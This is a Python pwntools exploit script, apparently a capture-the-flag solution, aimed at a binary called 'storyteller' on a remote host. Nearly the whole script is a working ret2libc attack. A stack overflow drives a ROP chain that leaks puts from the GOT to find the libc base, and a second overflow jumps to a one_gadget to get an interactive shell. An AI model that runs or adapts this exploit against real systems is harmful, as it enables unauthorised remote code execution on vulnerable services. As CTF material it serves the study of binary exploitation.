#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./storyteller --host 81.94.150.171 --port 10060 --libc ./libc.so.6
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './storyteller')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '81.94.150.171'
port = int(args.PORT or 10060)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
one_gadget = 0xe3afe 
gift_from_uncle_sam = 0x40119b
puts_got = 0x404000
puts_plt = 0x401030
puts_offset = 0x84420
pop_rdi_gadget = 0x4011a2
vuln_address = 0x401136

payload = b'A' * 48 + b'A' * 8
payload += p64(pop_rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln_address)

io.recv()
io.sendline(payload)
io.recvline()
l1 = io.recvline()
leaked_puts = u64(l1.ljust(8, b'\x00'))
log.success("Leaked puts address: %s", hex(leaked_puts))
libc_base = leaked_puts - puts_offset
log.success("Libc base: %s", hex(libc_base))
libc_base = libc_base - 0xa000000000000
log.success("Fixed Libc base: %s", hex(libc_base))
io.recv()

payload_two = b'A' * 48 + b'A' * 8
payload_two += p64(gift_from_uncle_sam)
payload_two += p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00)
payload_two += p64(libc_base + one_gadget)
io.sendline(payload_two)
io.interactive()

